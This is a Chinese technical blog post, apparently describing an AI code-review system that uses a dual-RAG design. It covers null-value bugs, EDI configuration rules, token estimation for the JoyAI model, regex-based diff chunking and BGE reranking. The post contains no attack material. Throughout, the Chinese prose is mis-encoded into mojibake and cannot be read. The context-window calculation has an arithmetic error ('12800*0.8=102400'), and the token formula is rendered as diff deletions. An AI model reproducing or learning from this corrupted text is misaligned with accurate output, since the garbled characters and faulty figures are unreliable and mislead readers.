<h3 data-id="heading-5">é—®é¢˜1ï¼šä¸‰æ–¹ç³»ç»Ÿç©ºå€¼å¤„ç†å¼‚å¸¸</h3>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-vbscript" lang="vbscript">// é—®é¢˜ä»£ç ï¼šä¸‰æ–¹ç³»ç»Ÿåœ°å€ç¼–ç å­—æ®µå¤„ç†
<span class="hljs-built_in">request</span>.setAddressCode(String.valueOf(address.getCode()));
// å½“address.getCode()ä¸º<span class="hljs-literal">null</span>æ—¶ï¼ŒString.valueOf(<span class="hljs-literal">null</span>)è¿”å›<span class="hljs-string">"null"</span>å­—ç¬¦ä¸²
// å¯¼è‡´ä¸‰æ–¹ç³»ç»ŸInteger.parse<span class="hljs-built_in">Int</span>(<span class="hljs-string">"null"</span>)æŠ›å‡ºNumberFormatException
</code></pre>
<p><strong>æŠ€æœ¯1çš„é—®é¢˜</strong>ï¼š</p>
<p>ç†è®ºä¸Šï¼Œå¯ä»¥é€šè¿‡åœ¨Promptä¸­ç¡¬ç¼–ç â€œä¸‰æ–¹æ¥å£åœ°å€ç¼–ç é¡»ä¸ºæ•°å­—ç±»å‹å­—ç¬¦ä¸²â€ çš„è§„åˆ™æ¥è¯†åˆ«æ­¤é—®é¢˜ã€‚ç„¶è€Œï¼Œéšç€ä¸šåŠ¡åœºæ™¯å¢å¤šï¼Œæ‰€æœ‰è§„åˆ™éƒ½è¢«æŒ¤å‹åœ¨æœ‰é™çš„ä¸Šä¸‹æ–‡çª—å£å†…ç«äº‰ã€‚å½“ä»£ç å˜æ›´è§¦å‘è‡ªåŠ¨å‹ç¼©ï¼ˆå¦‚æˆªæ–­è‡³10è¡Œï¼‰æ—¶ï¼Œè¢«ä¿ç•™çš„ä¸Šä¸‹æ–‡å…·æœ‰æå¤§çš„éšæœºæ€§ï¼Œä¸å½“å‰è¯„å®¡å¼ºç›¸å…³çš„è¯„å®¡è§„åˆ™å¾ˆå¯èƒ½è¢«å…¶ä»–æ— å…³è§„åˆ™æŒ¤æ‰æˆ–å› è‡ªåŠ¨å‹ç¼©è€Œè¢«æˆªæ‰ï¼Œå¯¼è‡´å…¶æ— æ³•è¢«ç¨³å®šè§¦å‘ï¼Œä»è€Œæ¼æŠ¥ã€‚</p>
<p><strong>æŠ€æœ¯2çš„é—®é¢˜</strong>ï¼š</p>
<p>è¯¥æ–¹æ¡ˆè™½ç„¶ç†è®ºä¸Šèƒ½å¤Ÿé€šè¿‡çŸ¥è¯†åº“æ£€ç´¢åˆ°ç›¸å…³è§„åˆ™ï¼Œä½†å…¶ä¸ç¨³å®šçš„çŸ¥è¯†å½’çº³è¿‡ç¨‹å¯¼è‡´ä»£ç ä¸Šä¸‹æ–‡çš„ç†è§£æ—¶å¥½æ—¶åï¼Œä½¿å¾—è§„åˆ™æ£€ç´¢çš„å‡†ç¡®æ€§æ³¢åŠ¨è¾ƒå¤§ã€‚åŒæ—¶ï¼Œæœªå¯¹æ£€ç´¢ç»“æœè¿›è¡Œé‡æ’åºï¼Œè¿›ä¸€æ­¥æ”¾å¤§äº†è¿™ç§ä¸ç¡®å®šæ€§ã€‚æœ€ç»ˆï¼Œç”±äºç¼ºä¹ç¨³å®šã€å¯é çš„ä¸Šä¸‹æ–‡æ”¯æ’‘ï¼Œç³»ç»Ÿæ— æ³•æŒç»­ã€å‡†ç¡®åœ°è¯†åˆ«æ­¤ç±»é—®é¢˜ï¼Œå…¶è¯„å®¡ç»“æœè¡¨ç°å‡ºæ˜¾è‘—çš„éšæœºæ€§ã€‚</p>
<h3 data-id="heading-6">é—®é¢˜2ï¼šEDIé¡¹ç›®ä¸­çš„è¯­æ³•é”™è¯¯</h3>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- é”™è¯¯ï¼šä½¿ç”¨å˜é‡è€Œéå­—é¢å¸¸é‡ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">case</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"${orderType}"</span>&gt;</span>
<span class="hljs-comment">&lt;!-- æ­£ç¡®åº”ä½¿ç”¨å­—é¢å€¼ï¼š&lt;case value="NORMAL"&gt; --&gt;</span>
</code></pre>
<p><strong>EDIå¹³å°ä»‹ç»ï¼š</strong></p>
<p>EDIï¼ˆç”µå­æ•°æ®äº¤æ¢ï¼‰æ˜¯ç”¨æ¥è§£å†³äº¬ä¸œç‰©æµä¸å¤šæ ·åŒ–å•†å®¶ç³»ç»Ÿé—´çš„å¯¹æ¥éš¾é¢˜çš„æŠ€æœ¯ï¼Œå…¶å…³é”®åŠŸèƒ½åŒ…æ‹¬<strong>åè®®è½¬æ¢ã€æ•°æ®æ ¼å¼è½¬æ¢ã€æ•°æ®æ ¡éªŒå’Œæµç¨‹ç¼–æ’</strong>ã€‚è¿™æ„å‘³ç€EDIé…ç½®æ–‡ä»¶å¿…é¡»ä¸¥æ ¼éµå®ˆé¢„å®šä¹‰çš„è¯­æ³•å’Œæ ‡å‡†ï¼Œä»»ä½•åå·®éƒ½å¯èƒ½å¯¼è‡´å¹³å°çš„æ ¸å¿ƒè½¬æ¢ä¸æ ¡éªŒåŠŸèƒ½å¤±æ•ˆã€‚</p>
<p><strong>æŠ€æœ¯1çš„é—®é¢˜</strong>ï¼š</p>
<p>ç”±äºå…¶ç¼ºä¹å¯¹EDIé…ç½®è¯­æ³•ä¸è§„èŒƒçš„é¢†åŸŸçŸ¥è¯†ï¼Œå¦‚æœè‡ªå®šä¹‰è§„åˆ™ï¼Œä¼šé‡åˆ°é—®é¢˜1ä¸€æ ·çš„æç¤ºè¯å¤©èŠ±æ¿å’Œä¸Šä¸‹æ–‡æˆªæ–­çš„é—®é¢˜ã€‚</p>
<p><strong>æŠ€æœ¯2çš„é—®é¢˜</strong>ï¼š</p>
<p>é™¤äº†ä¸Šé¢æåˆ°çš„çŸ¥è¯†å½’çº³è¿‡ç¨‹çš„ä¸ç¨³å®šé—®é¢˜ï¼ŒæŠ€æœ¯2ä¹Ÿé¢ä¸´ä¸€ä¸ªæ›´å‰ç½®çš„çš„æŒ‘æˆ˜ï¼šå®ƒç¼ºä¹å¯¹é¡¹ç›®èº«ä»½çš„æ„ŸçŸ¥èƒ½åŠ›ã€‚ç³»ç»Ÿåœ¨å¤„ç†ä¸€ä¸ªXMLé…ç½®æ–‡ä»¶æ—¶ï¼Œæ— æ³•è‡ªåŠ¨è¯†åˆ«å®ƒéš¶å±äºâ€œEDIé¡¹ç›®â€è€Œéæ™®é€šJavaåº”ç”¨ã€‚å› æ­¤ï¼Œåœ¨åç»­çš„RAGæ£€ç´¢è¿‡ç¨‹ä¸­ï¼Œå®ƒææœ‰å¯èƒ½ä½¿ç”¨é€šç”¨çš„Javaä»£ç è¯„å®¡è§„åˆ™ï¼Œè€Œæ— æ³•ç²¾å‡†å‘½ä¸­â€œEDIä¸“ç”¨é…ç½®è§„èŒƒâ€è¿™ä¸€å…³é”®ä¸Šä¸‹æ–‡ï¼Œå¯¼è‡´æ£€ç´¢æ–¹å‘é”™è¯¯ï¼Œæœ€ç»ˆæ— æ³•è¯†åˆ«å‡ºå¿…é¡»ä½¿ç”¨å­—é¢å¸¸é‡è¿™ä¸€ç‰¹å®šäºEDIé¢†åŸŸçš„åˆè§„æ€§è¦æ±‚ã€‚</p>
<h3 data-id="heading-7">è§£å†³æ–¹æ¡ˆï¼šåŒRAGæ¶æ„</h3>
<p>ï»¿</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1838f43ed42e416aa7a4ab110f569293~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593021&amp;x-signature=CP%2Bb2sLTGzq4dINYMaOb6iga7H4%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<h4 data-id="heading-8">1. è¯†åˆ«é¡¹ç›®ç±»å‹</h4>
<p>â€¢<strong>ç‰¹å¾è¯†åˆ«</strong>ï¼šåŸºäºæ–‡ä»¶æ‰©å±•åï¼ˆ.flow, .dtï¼‰è¿›è¡Œç²¾å‡†åˆ¤æ–­ã€‚</p>
<p>â€¢<strong>ä¼˜å…ˆçº§è®¾å®š</strong>ï¼šEDIé¡¹ç›®è¯†åˆ«ä¼˜å…ˆäºæ™®é€šJAVAé¡¹ç›®ï¼Œç¡®ä¿é¢†åŸŸç‰¹æ®Šæ€§å¾—åˆ°ä¼˜å…ˆå¤„ç†ã€‚</p>
<p>â€¢<strong>ç­–ç•¥å½±å“</strong>ï¼šé¡¹ç›®ç±»å‹ç›´æ¥å†³å®šåç»­<strong>è¯„å®¡è§„åˆ™çš„é€‰æ‹©</strong>ä¸<strong>RAGçŸ¥è¯†åº“çš„æ£€ç´¢ç­–ç•¥</strong>ï¼Œä»æºå¤´ä¿éšœäº†è¯„å®¡çš„é’ˆå¯¹æ€§ã€‚</p>
<h4 data-id="heading-9">2. ä»£ç åˆ†å—å¤„ç†</h4>
<p><strong>2.1 Tokenä¼°ç®—ç®—æ³•</strong></p>
<p>ç”±äºæˆ‘ä»¬ä½¿ç”¨çš„åº•å±‚å¤§æ¨¡å‹æ˜¯JoyAIï¼Œå¹¶æ²¡æœ‰å…¬å¼€tokenizerçš„ç»†èŠ‚ï¼Œæ ¹æ®<a href="https://link.juejin.cn?target=http%3A%2F%2Fdocs.chatrhino.jd.com%2Ftokenizers%2F" target="_blank" title="http://docs.chatrhino.jd.com/tokenizers/" ref="nofollow noopener noreferrer">å®˜ç½‘æ–‡æ¡£</a>æä¾›çš„tokenè®¡ç®—APIï¼š <a href="https://link.juejin.cn?target=http%3A%2F%2Fapi.chatrhino.jd.com%2Fapi%2Fv1%2Ftokenizer%2Festimate-token-count" target="_blank" title="http://api.chatrhino.jd.com/api/v1/tokenizer/estimate-token-count" ref="nofollow noopener noreferrer">api.chatrhino.jd.com/api/v1/tokeâ€¦</a></p>
<p>æµ‹è¯•äº†å‡ ç»„æ•°æ®ï¼š</p>













































































<table><thead><tr><th>æµ‹è¯•æ–‡æœ¬</th><th>å­—ç¬¦é•¿åº¦</th><th>å®é™…Tokenæ•°</th><th>å†…å®¹Tokenå¢é‡</th></tr></thead><tbody><tr><td>ç©ºå­—ç¬¦ä¸²</td><td>0</td><td>63</td><td>0</td></tr><tr><td>"a"</td><td>1</td><td>64</td><td>+1</td></tr><tr><td>"hello"</td><td>5</td><td>64</td><td>+1</td></tr><tr><td>"code"</td><td>4</td><td>64</td><td>+1</td></tr><tr><td>"hello world"</td><td>11</td><td>65</td><td>+2</td></tr><tr><td>"æµ‹è¯•"</td><td>2</td><td>64</td><td>+1</td></tr><tr><td>"ç¼–ç¨‹ç¼–ç¨‹"</td><td>4</td><td>65</td><td>+2</td></tr><tr><td>"æµ‹è¯•æµ‹è¯•æµ‹è¯•æµ‹è¯•æµ‹è¯•"</td><td>10</td><td>68</td><td>+5</td></tr><tr><td>"helloä¸–ç•Œ"</td><td>7</td><td>65</td><td>+2</td></tr><tr><td>"programmingä»£ç "</td><td>13</td><td>66</td><td>+3</td></tr><tr><td>é‡å¤"programmingä»£ç "3æ¬¡</td><td>39</td><td>72</td><td>+9</td></tr></tbody></table>
<p><strong>æ¨å¯¼è¿‡ç¨‹</strong></p>
<p>é€šè¿‡åˆ†ææµ‹è¯•æ•°æ®ï¼Œæˆ‘ä»¬å‘ç°äº†ä»¥ä¸‹å…³é”®è§„å¾‹ï¼š</p>
<p>1.åŸºç¡€ç³»ç»Ÿå¼€é”€ï¼šæ‰€æœ‰è¯·æ±‚éƒ½æœ‰63 tokensçš„å›ºå®šå¼€é”€</p>
<p>2.è‹±æ–‡å•è¯åˆ†çº§ï¼š</p>
<p>â—¦1-5å­—ç¬¦å•è¯ = 1 tokenï¼ˆ"a"ã€"hello"ã€"code"ï¼‰</p>
<p>â—¦6-10å­—ç¬¦å•è¯ â‰ˆ 2 tokensï¼ˆæ¨æµ‹å€¼ï¼‰</p>
<p>â—¦11+å­—ç¬¦å•è¯ = 3 tokensï¼ˆ"programming"ï¼‰</p>
<p>3.ä¸­æ–‡åˆ†è¯è§„åˆ™ï¼šæ¯2ä¸ªä¸­æ–‡å­—ç¬¦ = 1 token</p>
<p>4.ç©ºæ ¼å¤„ç†ï¼šç©ºæ ¼ä½œä¸ºåˆ†éš”ç¬¦ï¼Œä¸å¢åŠ é¢å¤–token</p>
<p>5.æ··åˆå†…å®¹ï¼šæŒ‰å­—ç¬¦ç±»å‹åˆ†æ®µè®¡ç®—åæ±‚å’Œ</p>
<p>åŸºäºä¸Šè¿°è§„å¾‹ï¼Œæˆ‘ä»¬æ„å»ºäº†ä»¥ä¸‹ä¼°ç®—å…¬å¼ï¼š</p>
<pre><code class="hljs language-diff" lang="diff">æ€»Tokens = 63 + âˆ‘(å•è¯token)

å•è¯tokenè®¡ç®—ï¼š
<span class="hljs-deletion">- å•å­—ç¬¦å•è¯: 1 token</span>
<span class="hljs-deletion">- è‹±æ–‡å•è¯(â‰¤5å­—ç¬¦): 1 token  </span>
<span class="hljs-deletion">- è‹±æ–‡å•è¯(6-10å­—ç¬¦): 2 tokens</span>
<span class="hljs-deletion">- è‹±æ–‡å•è¯(â‰¥11å­—ç¬¦): 3 tokens</span>
<span class="hljs-deletion">- ä¸­æ–‡æ–‡æœ¬: (å­—ç¬¦æ•° + 1) / 2 tokens</span>
<span class="hljs-deletion">- æ··åˆå†…å®¹: åˆ†æ®µè®¡ç®—åæ±‚å’Œ</span>
</code></pre>
<p><strong>2.2 åˆ†å—é˜ˆå€¼ä¸å®‰å…¨è®¾è®¡</strong></p>
<p>â€¢è§¦å‘é˜ˆå€¼ï¼šå½“é¢„ä¼°Tokenæ•° &gt; 100,000æ—¶ï¼Œè‡ªåŠ¨è§¦å‘åˆ†å—å¤„ç†æµç¨‹ã€‚</p>
<p>â—¦JoyAIçš„ä¸Šä¸‹æ–‡çª—å£æ˜¯<a href="https://link.juejin.cn?target=http%3A%2F%2Fdocs.chatrhino.jd.com%2Fhttp%2F" target="_blank" title="http://docs.chatrhino.jd.com/http/" ref="nofollow noopener noreferrer">128K</a>ï¼Œç”±äºJoyAIæ²¡è¯´æ˜1Kæ˜¯1024è¿˜æ˜¯1000ï¼Œä¿å®ˆä¼°è®¡ä½¿ç”¨1000</p>
<p>â—¦128K = 128000ï¼Œä¸ºäº†é¿å…è¶…è¿‡ä¸Šä¸‹æ–‡çª—å£ï¼Œç•™ä¸ªå¯Œä½™é‡ï¼Œä½¿ç”¨80%ï¼Œ12800*0.8=102400 â‰ˆ100000</p>
<p>ï»¿</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55065fb2c42349f393086615f39cee9c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593021&amp;x-signature=zQaHqt8KIyI50m3gy4jnQQs3Ek0%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>â€¢å•å—å®¹é‡ï¼šè®¾å®š MAX_TOKENS_PER_CHUNK = 60000ï¼Œä¸ºæ¨¡å‹è¾“å‡ºåŠä¸Šä¸‹æ–‡é¢„ç•™40%çš„å®‰å…¨ä½™é‡ã€‚</p>
<p>â€¢è®¾è®¡ç†å¿µï¼šé€šè¿‡ä¸¥æ ¼çš„å®¹é‡æ§åˆ¶ï¼Œç¡®ä¿å•æ¬¡å¤„ç†è´Ÿè½½å‡åœ¨æ¨¡å‹çª—å£çš„å®‰å…¨èŒƒå›´å†…ã€‚</p>
<p><strong>2.3 æ™ºèƒ½åˆ†å—ç­–ç•¥</strong></p>
<p>ç³»ç»Ÿé‡‡ç”¨ä¸¤çº§åˆ†å—ç­–ç•¥ï¼Œç¡®ä¿ä»£ç è¯­ä¹‰çš„å®Œæ•´æ€§ï¼š</p>
<p><strong>2.3.1 æ–‡ä»¶çº§åˆ†å‰²</strong></p>
<p>é€šè¿‡git diffæŒ‡ä»¤è¯†åˆ«æ–‡ä»¶è¾¹ç•Œï¼Œç¡®ä¿å•ä¸ªæ–‡ä»¶çš„ä»£ç å®Œæ•´æ€§ï¼Œé¿å…è·¨æ–‡ä»¶åˆ†å‰²ã€‚</p>
<pre><code class="hljs language-css" lang="css">Pattern<span class="hljs-selector-class">.compile</span>("diff <span class="hljs-attr">--git</span> <span class="hljs-selector-tag">a</span>/(.+?) <span class="hljs-selector-tag">b</span>/(.+?)\n") 
</code></pre>
<p><strong>2.3.2 ä»£ç ç»“æ„æ„ŸçŸ¥åˆ†å‰²</strong></p>
<p>åˆ©ç”¨æ–¹æ³•ç­¾åæ¨¡å¼è¯†åˆ«ä»£ç ç»“æ„è¾¹ç•Œï¼š</p>
<pre><code class="hljs language-ini" lang="ini">Pattern <span class="hljs-attr">methodPattern</span> = Pattern.compile(
 "(<span class="hljs-section">[+-]</span>\s*((public|private|protected)\s+)?(\w+\s+)?\w+\s*\(<span class="hljs-section">[^)]</span>*\)\s*\{)",Pattern.MULTILINE)<span class="hljs-comment">;</span>
</code></pre>
<p>åœ¨æ–¹æ³•æˆ–ç±»çš„è‡ªç„¶è¾¹ç•Œå¤„è¿›è¡Œåˆ†å‰²ï¼Œæœ€å¤§é™åº¦ä¿æŒä»£ç å—çš„è¯­ä¹‰å®Œæ•´æ€§ã€‚</p>
<h4 data-id="heading-10">3. RAGå¢å¼ºä¸é‡æ’åºæœºåˆ¶</h4>
<p><strong>3.1 åŸºäºçŸ¥è¯†å·¥ç¨‹çš„ä»£ç ç‰‡æ®µã€ä¸šåŠ¡ä¸Šä¸‹æ–‡çš„æ£€ç´¢</strong></p>
<p>åœ¨ RAGå¢åŠ æœåŠ¡ä¸­å®ç°å¤šç»´åº¦æ£€ç´¢å¢å¼ºï¼š</p>
<p>â€¢ä¸šåŠ¡é¢†åŸŸè¯†åˆ«ï¼šåŸºäºä»£ç å†…å®¹è¯†åˆ«æ˜¯ä»“ä¸šåŠ¡ï¼ˆWMSï¼‰ã€ä»“é…æ¥å…¥ä¸šåŠ¡ï¼ˆECLPï¼‰ã€è½¬è¿ä¸­å¿ƒä¸šåŠ¡ï¼ˆTCï¼‰ç­‰ã€‚</p>
<p>â€¢å…³é”®è¯æå–ä¸è¿‡æ»¤ï¼šä»å˜æ›´æ–‡ä»¶ä¸­æå–å¹¶å‡€åŒ–å…³é”®æœ¯è¯­ã€‚</p>
<p>â€¢é€šè¿‡æ‰§è¡Œè¯­ä¹‰æœç´¢ã€‚</p>
<p>é‡æ’åºä¼˜åŒ–ï¼šå¯¹æ£€ç´¢ç»“æœä½¿ç”¨BGEæ¨¡å‹è¿›è¡Œé‡æ’åºï¼Œæå‡ç›¸å…³æ€§ã€‚</p>
<p><strong>3.2 é‡æ’åº</strong></p>
<p>åœ¨RAGç³»ç»Ÿä¸­ï¼Œæ£€ç´¢ï¼ˆå¬å›ï¼‰è¿™ä¸€æ­¥é€šå¸¸ä½¿ç”¨å‘é‡ç›¸ä¼¼åº¦æœç´¢ã€‚è¿™ç§æ–¹æ³•è¿½æ±‚çš„æ˜¯é«˜å¬å›ç‡â€”â€”å³å°½å¯èƒ½ä¸é—æ¼ä»»ä½•å¯èƒ½ç›¸å…³çš„æ–‡æ¡£ã€‚ä½†è¿™å°±å¸¦æ¥äº†ä¸€ä¸ªé—®é¢˜ï¼š</p>
<p>â—¦æ•°é‡è¿‡å¤šï¼šå¯èƒ½ä¼šè¿”å›å¤§é‡å€™é€‰æ–‡æ¡£ï¼Œå…¨éƒ¨é€å…¥å¤§æ¨¡å‹ä¼šå¯¼è‡´è¶…è¿‡ä¸Šä¸‹æ–‡çª—å£é™åˆ¶ï¼Œæˆæœ¬é«˜æ˜‚ä¸”é€Ÿåº¦æ…¢ã€‚</p>
<p>â—¦è´¨é‡ä¸å‡ï¼šå‘é‡æœç´¢æ˜¯åŸºäºè¯­ä¹‰ç›¸ä¼¼åº¦ï¼Œä½†â€œç›¸ä¼¼â€ä¸ä¸€å®šç­‰äºâ€œæœ‰ç”¨â€ã€‚å®ƒå¯èƒ½ä¼šå¬å›ä¸€äº›ï¼š</p>
<p>â–ªä¸»é¢˜ç›¸å…³ä½†å†…å®¹æ³›æ³›çš„æ–‡æ¡£ã€‚</p>
<p>â–ªåŒ…å«å…³é”®è¯ä½†é€»è¾‘ä¸åŒ¹é…çš„æ–‡æ¡£ã€‚</p>
<p>â–ªç›¸å…³æ€§æ’åä¸é«˜ä½†å®é™…è‡³å…³é‡è¦çš„â€œçå®â€æ–‡æ¡£ã€‚</p>
<p>ä¾‹å¦‚æ£€ç´¢â€œå¦‚ä½•åšç•ªèŒ„ç‚’è›‹â€ï¼Œå‘é‡ç›¸ä¼¼åº¦æŸ¥è¯¢ç»“æœå¯èƒ½ä¼šæ‰¾åˆ°ï¼š</p>
<p>â—¦ã€Šç•ªèŒ„ç‚’è›‹çš„æœ€æ­£å®—åšæ³•ã€‹ ï¼ˆæåº¦ç›¸å…³ï¼Œæ’åç¬¬ä¸€ï¼‰</p>
<p>â—¦ã€Š100é“å®¶å¸¸èœè°±ã€‹ ï¼ˆç›¸å…³ï¼Œä½†èŒƒå›´å¤ªå¹¿ï¼‰</p>
<p>â—¦ã€Šé¸¡è›‹çš„è¥å…»ä»·å€¼ã€‹ ï¼ˆéƒ¨åˆ†ç›¸å…³ï¼‰</p>
<p>â—¦ã€Šç•ªèŒ„ç§æ¤æŒ‡å—ã€‹ ï¼ˆä»…å…³é”®è¯ç›¸å…³ï¼Œå®é™…æ— ç”¨ï¼‰</p>
<p>å¦‚æœä¸ç»å¤„ç†ï¼ŒæŠŠè¿™å››ç¯‡æ–‡æ¡£å¡ç»™å¤§æ¨¡å‹ï¼Œæ¨¡å‹éœ€è¦è´¹åŠ›åœ°ä»å¤§é‡æ–‡æœ¬ä¸­è¾¨åˆ«å“ªäº›æ˜¯çœŸæ­£æœ‰ç”¨çš„ä¿¡æ¯ï¼Œä¸ä»…å¢åŠ äº†Tokenæ¶ˆè€—ï¼Œæ›´ä¸¥é‡çš„æ˜¯ï¼Œæ— å…³ä¿¡æ¯ä¼šå½¢æˆâ€œå™ªå£°â€ï¼Œå¹²æ‰°æ¨¡å‹çš„åˆ¤æ–­ï¼Œå¯¼è‡´ç”Ÿæˆè´¨é‡ä¸‹é™â€”â€”æ¨¡å‹å¹»è§‰ã€‚</p>
<p>ä¸ºäº†èŠ‚çœæˆæœ¬ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†æœ¬åœ°é‡æ’åºæ–¹æ¡ˆï¼š</p>
<p>â—¦æ¨¡å‹æ–‡ä»¶: bge-reranker-base.onnx (<a href="https://link.juejin.cn?target=https%3A%2F%2Fbge-model.com%2Ftutorial%2F1_Embedding%2F1.2.1.html" target="_blank" title="https://bge-model.com/tutorial/1_Embedding/1.2.1.html" ref="nofollow noopener noreferrer">BGE</a>é‡æ’åºæ¨¡å‹)</p>
<p>â—¦åˆ†è¯å™¨: HuggingFaceTokenizer</p>
<p>â—¦è¿è¡Œæ—¶: ONNX Runtime Java API</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ ¸å¿ƒæµç¨‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Map</span>.<span class="hljs-property">Entry</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Float</span>&gt;&gt; <span class="hljs-title function_">rerankBatch</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> query, List&lt;<span class="hljs-built_in">String</span>&gt; documents</span>) {
 <span class="hljs-comment">// 1. æ–‡æœ¬é¢„å¤„ç†å’Œåˆ†è¯</span>
 <span class="hljs-comment">// 2. æ„å»ºæŸ¥è¯¢-æ–‡æ¡£å¯¹</span>
 <span class="hljs-comment">// 3. ONNXæ¨¡å‹æ¨ç†</span>
 <span class="hljs-comment">// 4. ç›¸å…³æ€§è¯„åˆ†è®¡ç®—</span>
 <span class="hljs-comment">// 5. æŒ‰åˆ†æ•°é™åºæ’åº</span>
 <span class="hljs-comment">// 6. è¿”å›æ’åºç»“æœ</span>
}
</code></pre>
<p>ç¤ºä¾‹ï¼š</p>
<p>ï»¿</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d7242aeb7994d769a534fcf93f1d8c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593021&amp;x-signature=GIWf0M4%2B9hfQF5Z6kTytnqcrZiM%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<h4 data-id="heading-11">4. å®é™…åº”ç”¨æ•ˆæœéªŒè¯</h4>
<p><strong>æ¡ˆä¾‹1ï¼šæˆåŠŸé¢„é˜²ç©ºå€¼å¤„ç†äº‹æ•…</strong></p>
<p>ï»¿</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d2930bd90b2440aa97c72a324acdbfb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593021&amp;x-signature=3xT6V9I5y3Asyas84V38D0heafw%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p><strong>æ¡ˆä¾‹2ï¼šEDIé…ç½®è§„èŒƒæ£€æŸ¥</strong></p>
<p>ï»¿</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/160fab01cd9b406ab7d45a78689af637~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593021&amp;x-signature=k4vKjJLdCmXNrMizEc8BgkMXCrU%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>ï»¿</p>
<h2 data-id="heading-12">æ€»ç»“ä¸å±•æœ›</h2>
<p>æˆ‘ä»¬æ¢ç´¢å‡ºçš„åŒRAGæ¶æ„ï¼Œå…¶ä»·å€¼æ ¸å¿ƒå¹¶éè¿½æ±‚æè‡´çš„ç®€å•æˆ–æ•æ·ï¼Œè€Œæ˜¯å®ƒæ—¢èƒ½åƒèµ„æ·±çš„ä¸€çº¿ç ”å‘ä¸€æ ·ï¼Œæ·±åº¦ç†è§£ä¸šåŠ¡åŠä»£ç å˜æ›´çš„å…·ä½“è¯­å¢ƒä¸æ½œåœ¨å½±å“ï¼Œåˆèƒ½åƒä¸¥è°¨çš„æ¶æ„å¸ˆä¸€æ ·ï¼Œä¸¥æ ¼éµå¾ªæˆæ–‡çš„è§„èŒƒä¸æœ€ä½³å®è·µã€‚</p>
<p>é€šè¿‡ç»“æ„åŒ–çš„ååŒæœºåˆ¶ï¼Œç³»ç»Ÿå°†ä¸¤ç§ä¸åŒè´¨ã€ä¸åŒæºçš„çŸ¥è¯†ï¼ˆæ·±åº¦çš„ä»£ç è¯­ä¹‰ä¸ç²¾å‡†çš„è¯„å®¡è§„åˆ™ï¼‰è¿›è¡Œèåˆï¼Œå®ç°äº† â€œ1+1 &gt; 2â€ çš„æ™ºèƒ½æ¶Œç°ï¼Œä»è€Œå…·å¤‡äº†è¯†åˆ«å¹¶é¢„é˜²é‚£äº›å¤æ‚ã€éšè”½ä»£ç ç¼ºé™·çš„æ·±åº¦æ¨ç†èƒ½åŠ›ã€‚è¿™æ­£æ˜¯æˆ‘ä»¬åœ¨é«˜å¹¶å‘ã€é«˜å¯ç”¨è¦æ±‚æä¸ºä¸¥è‹›çš„å¤§ä¿ƒç­‰åœºæ™¯ä¸‹ï¼Œä¸ºå¤¯å®ç³»ç»Ÿç¨³å®šæ€§åŸºçŸ³æ‰€åšå‡ºçš„å…³é”®æ€§æ¶æ„å†³ç­–ã€‚</p>
<p>è¿™ä¸€æˆåŠŸå®è·µï¼Œä¸ºæˆ‘ä»¬å¥ å®šäº†ä»£ç è¯„å®¡å·¥ä½œä¸­åšå®çš„æŠ€æœ¯åŸºçŸ³ï¼Œå¹¶æ¸…æ™°åœ°æŒ‡æ˜äº†æœªæ¥çš„æ¼”è¿›è·¯å¾„ï¼š</p>
<p>1.<strong>è¿ˆå‘å¤šæ¨¡æ€ä»£ç ç†è§£</strong>ï¼šä»çº¯æ–‡æœ¬ä»£ç è¯„å®¡ï¼Œæ‰©å±•è‡³å¯¹æ¶æ„å›¾ã€æ—¶åºå›¾ç­‰éç»“æ„åŒ–è®¾è®¡äº§ç‰©çš„ç†è§£ä¸åˆè§„æ€§æ£€æŸ¥ã€‚</p>
